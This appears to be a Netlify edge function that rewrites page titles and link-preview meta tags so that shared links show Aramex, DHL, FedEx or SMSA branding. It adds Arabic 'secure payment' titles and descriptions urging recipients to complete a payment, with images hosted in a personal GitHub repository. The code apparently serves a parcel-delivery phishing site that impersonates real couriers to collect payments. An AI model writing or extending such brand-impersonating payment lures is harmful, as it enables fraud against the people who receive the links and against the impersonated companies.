import { Context } from "https://edge.netlify.com";

const GITHUB_CDN = 'https://raw.githubusercontent.com/you3333ef/Youssef-Dafa/main/public';

const companyMeta: Record<string, { title: string; description: string; image: string }> = {
  aramex: {
    title: "دفع آمن - أرامكس للشحن السريع 🚚",
    description: "خدمات شحن عالمية مع أرامكس - أكمل عملية الدفع بأمان تام للحصول على خدمات شحن سريعة وموثوقة ✅",
    image: "/og-aramex.jpg"
  },
  dhl: {
    title: "دفع آمن - DHL الشحن العالمي السريع ⚡",
    description: "DHL - الشبكة العالمية الأكبر للشحن السريع - أكمل دفعتك بأمان للحصول على خدمات توصيل سريعة وموثوقة 🌍",
    image: "/og-dhl.jpg"
  },
  fedex: {
    title: "دفع آمن - FedEx الشحن الدولي الموثوق 📦",
    description: "FedEx - رائدة الشحن الدولي - ادفع بأمان واحصل على خدمات شحن موثوقة مع تتبع فوري ⏰",
    image: "/og-fedex.jpg"
  },
  smsa: {
    title: "دفع آمن - SMSA Express سمسا إكسبرس 🚛",
    description: "SMSA Express - الرائدة في الشحن السعودي - أكمل الدفع بأمان للحصول على خدمات توصيل سريعة 🇸🇦",
    image: "/og-smsa.jpg"
  },
  default: {
    title: "منصة الدفع الذكية - خدمات دفع آمنة لدول الخليج 💳",
    description: "منصة متكاملة لخدمات الدفع الإلكتروني في دول الخليج - شحن، فواتير، عقود، خدمات حكومية وصحية بأمان",
    image: "/og-aramex.jpg"
  }
};

// Main Handler with Try/Catch protection
export default async (request: Request, context: Context) => {
  try {
    return await handleDynamicMeta(request, context);
  } catch (error) {
    console.error("EDGE_FUNCTION_CRASH:", error);
    // Fallback to original response instead of crashing
    return context.next();
  }
};

async function handleDynamicMeta(request: Request, context: Context) {
  const url = new URL(request.url);
  const response = await context.next();
  
  // Only process successful HTML responses
  const contentType = response.headers.get("content-type") || "";
  if (!response.ok || !contentType.includes("text/html")) {
    return response;
  }

  let html = "";
  try {
    html = await response.text();
  } catch (e) {
    return response;
  }

  // Extract company from path or query
  const pathParts = url.pathname.split('/');
  let companyKey = "default";
  
  if (pathParts[1] === 'p' && pathParts.length >= 3) {
    companyKey = pathParts[3] || "default";
  } else {
    companyKey = url.searchParams.get("company") || url.searchParams.get("c") || url.searchParams.get("service") || "default";
  }

  const meta = companyMeta[companyKey.toLowerCase()] || companyMeta.default;
  const fullImageUrl = `${GITHUB_CDN}${meta.image}`;

  // Simple and safe string replacements
  const replacements: Record<string, string> = {
    '<title>': `<title>${meta.title}</title><!--`,
    '</title>': `-->`,
    '<meta property="og:title"': `<meta property="og:title" content="${meta.title}"/><meta data-replaced="true" `,
    '<meta property="og:description"': `<meta property="og:description" content="${meta.description}"/><meta data-replaced="true" `,
    '<meta property="og:image"': `<meta property="og:image" content="${fullImageUrl}"/><meta data-replaced="true" `,
  };

  // Inject OG Tags after <head> for maximum reliability
  const ogTags = `
    <title>${meta.title}</title>
    <meta name="description" content="${meta.description}"/>
    <meta property="og:title" content="${meta.title}"/>
    <meta property="og:description" content="${meta.description}"/>
    <meta property="og:image" content="${fullImageUrl}"/>
    <meta property="og:image:width" content="1200"/>
    <meta property="og:image:height" content="630"/>
    <meta property="og:type" content="website"/>
    <meta name="twitter:card" content="summary_large_image"/>
    <meta name="twitter:title" content="${meta.title}"/>
    <meta name="twitter:description" content="${meta.description}"/>
    <meta name="twitter:image" content="${fullImageUrl}"/>
  `;

  html = html.replace(/<head>/i, `<head>${ogTags}`);

  return new Response(html, {
    headers: {
      ...Object.fromEntries(response.headers),
      "content-type": "text/html; charset=utf-8",
      "cache-control": "no-cache, no-store, must-revalidate",
    }
  });
}
